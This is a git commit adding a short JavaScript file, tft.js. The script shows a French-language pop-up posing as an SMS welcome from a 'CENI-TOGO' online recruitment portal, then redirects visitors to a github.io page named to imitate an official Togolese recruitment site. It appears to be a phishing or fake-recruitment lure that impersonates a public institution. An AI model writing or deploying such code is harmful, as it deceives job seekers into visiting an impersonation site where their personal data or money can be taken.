6ceb311252d1d13b4b6319f40751330f1275c8e4
newsofferz <joyparker838+tf@gmail.com>
2025-03-15 00:21:09 +0100

    Create tft.js

---
+++ tft.js
@@ -0,0 +1,6 @@
+
+var password = 'CENI-TOGO'
+password=prompt('SMS :Bienvenue sur notre portail de recrutement en ligne, cliquez sur OK pour démarrer la candidature  ','CENI-TOGO');
+if (password != 'CENI-TOGO') {
+location.href='https://newsofferz.github.io/cenitogo.recrutement.tg';
+}
